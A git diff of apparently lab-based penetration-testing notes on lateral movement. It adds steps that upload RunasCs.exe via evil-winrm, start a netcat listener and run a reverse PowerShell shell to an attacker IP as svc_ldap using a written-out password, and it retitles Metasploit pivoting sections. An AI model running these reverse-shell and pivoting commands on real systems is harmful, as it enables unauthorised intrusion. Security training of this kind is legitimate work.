@@ -9,12 +9,43 @@ tags:
 
 # Lateral movements
 
+
+## Windows
+
+### Running as another user
+
+Logged as user1 with evil-winrm we cannot run psexec or any other tool requiring to confirm a modal, since we only have terminal access. 
+
+However, the tester can use the binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs
+
+Upload the binary to the machine:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload RunasCs.exe
+```
+
+Set a listener in a different terminal from the attacker's machine:
+
+```bash
+nc -lnvp 1234
+```
+
+Run a reverse shell:
+
+```bash
+.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234
+```
+
+
+
+## Scenario 1
+
 Lateral movement is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.
 
 ![lateral-movement.png](img/lateral-movement.png)
 
 
-## using metasploit
+### using metasploit
 
 1. Get our ip
 
@@ -105,7 +136,7 @@ $root@machine> ifconfig
 ```
 
 
-### route
+#### route
 
 9. Add tunnel from interface 192.64.166.3 (which is session 1 of meterpreter) and the discovered interface, 192.182.147.2 with the utility route:
 
@@ -138,7 +169,7 @@ msf  auxiliary/scanner/portscan/tcp > exploit
 # Give us ports 21 and 22 open at 192.182.147.3
 ```
 
-### portfwd
+#### portfwd
 
 12. In order to reach the discovered target, we need to fordward remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234. This is done with the utility portfwd from meterpreter
 
